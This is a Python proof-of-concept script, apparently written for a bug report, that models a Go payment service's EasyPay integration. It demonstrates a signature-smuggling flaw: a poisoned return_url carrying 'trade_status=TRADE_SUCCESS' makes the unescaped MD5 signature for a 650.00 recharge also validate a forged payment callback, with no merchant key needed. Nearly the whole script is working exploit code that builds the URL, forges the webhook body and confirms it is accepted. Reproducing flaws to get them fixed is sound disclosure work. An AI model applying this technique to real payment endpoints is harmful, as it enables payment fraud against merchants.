#!/usr/bin/env python3
"""
Independent Python model of the four Go functions involved, line-mapped to main@b8dece90.
Purpose: show the exact byte strings without waiting for the Go toolchain.
The AUTHORITATIVE check is the Go test (easypay_smuggle_poc_test.go) — this is a model.

  CanonicalizeReturnURL  payment_resume_service.go:235  (query NOT stripped)
  buildPaymentReturnURL  payment_resume_service.go:276  (query.Encode() re-sorts)
  createRedirectPayment  easypay.go:130                 (sign -> submit.php URL)
  easyPaySign            easypay.go:571                 (no escaping)
  VerifyNotification     easypay.go:340                 (rebuild from parsed query)
"""
import hashlib
from urllib.parse import urlparse, parse_qsl, urlencode

HOST, PKEY = "site.example.com", "SUPER_SECRET_MERCHANT_KEY"
RESULT_PATH = "/payment/result"


def canonicalize_return_url(raw):
    p = urlparse(raw)
    if p.scheme not in ("http", "https") or not p.hostname:
        raise ValueError("INVALID_RETURN_URL")
    if p.fragment:
        p = p._replace(fragment="")
    if (p.path or "/") != RESULT_PATH:
        raise ValueError("INVALID_RETURN_URL")
    if p.hostname != HOST:
        raise ValueError("INVALID_RETURN_URL")
    return p.geturl()          # <-- RawQuery survives


def build_payment_return_url(base, order_id, out_trade_no, resume_token=""):
    p = urlparse(base)
    q = dict(parse_qsl(p.query, keep_blank_values=True))
    if order_id > 0:
        q["order_id"] = str(order_id)
    if out_trade_no:
        q["out_trade_no"] = out_trade_no
    if resume_token:
        q["resume_token"] = resume_token
    q["status"] = "success"
        # Go's url.Values.Encode() sorts by key; Python's urlencode does not.
    return p._replace(query=urlencode(sorted(q.items()))).geturl()


def easy_pay_sign(params, pkey):
    d = {k: v for k, v in params.items()
         if k not in ("sign", "sign_type") and v != ""}
    s = "&".join(f"{k}={d[k]}" for k in sorted(d)) + pkey   # no urlencoding
    return hashlib.md5(s.encode()).hexdigest()


def verify_notification(raw_body):
    params = dict(parse_qsl(raw_body, keep_blank_values=True))
    sign = params.get("sign", "")
    if not sign:
        return None, "missing sign"
    if easy_pay_sign(params, PKEY) != sign:
        return None, "invalid signature"
    return {"status": "success" if params.get("trade_status") == "TRADE_SUCCESS" else "failed",
            "order": params.get("out_trade_no"), "amount": float(params.get("money", 0))}, "ok"


# ---- 1. attacker submits a poisoned return_url (passes CanonicalizeReturnURL) --
attacker_return = f"https://{HOST}{RESULT_PATH}?trade_status=TRADE_SUCCESS"
canonical = canonicalize_return_url(attacker_return)
provider_return = build_payment_return_url(canonical, 99, "sub2_ATTACKER_ORDER_0001")
print("attacker return_url :", attacker_return)
print("after canonicalize  :", canonical)
print("provider return_url :", provider_return)

# ---- 2. createRedirectPayment ------------------------------------------------
create_params = {
    "pid": "1000", "type": "alipay",
    "out_trade_no": "sub2_ATTACKER_ORDER_0001",
    "notify_url": f"https://{HOST}/api/v1/payment/webhook/easypay",
    "return_url": provider_return,
    "name": "balance recharge", "money": "650.00",
}
sign = easy_pay_sign(create_params, PKEY)
create_params["sign"] = sign
create_params["sign_type"] = "MD5"
print("\ncreate pay URL      :", f"https://pay.example.com/submit.php?{urlencode(create_params)}")

# ---- 3. forge the callback ---------------------------------------------------
prefix = provider_return[: -len("&trade_status=TRADE_SUCCESS")]
cb = {k: v for k, v in create_params.items() if k not in ("sign", "sign_type")}
cb["return_url"] = prefix
raw = urlencode(cb) + "&trade_status=TRADE_SUCCESS&sign=" + sign + "&sign_type=MD5"

cb_signed = dict(cb, trade_status="TRADE_SUCCESS")   # trade_status is a REAL top-level param
print("\nCREATE   base string:", "&".join(f"{k}={create_params[k]}" for k in sorted(create_params) if k not in ("sign", "sign_type")) + PKEY)
print("CALLBACK base string:", "&".join(f"{k}={cb_signed[k]}" for k in sorted(cb_signed)) + PKEY)

s1 = "&".join(f"{k}={create_params[k]}" for k in sorted(create_params) if k not in ("sign", "sign_type"))
s2 = "&".join(f"{k}={cb_signed[k]}" for k in sorted(cb_signed))
print("\nbyte-identical      :", s1 == s2)

n, err = verify_notification(raw)
print("VerifyNotification  :", "err =", err, "->", n)
print("\nRESULT:", "BUG REPRODUCED — forged callback accepted without pkey"
      if err == "ok" and n["status"] == "success" else "not reproduced")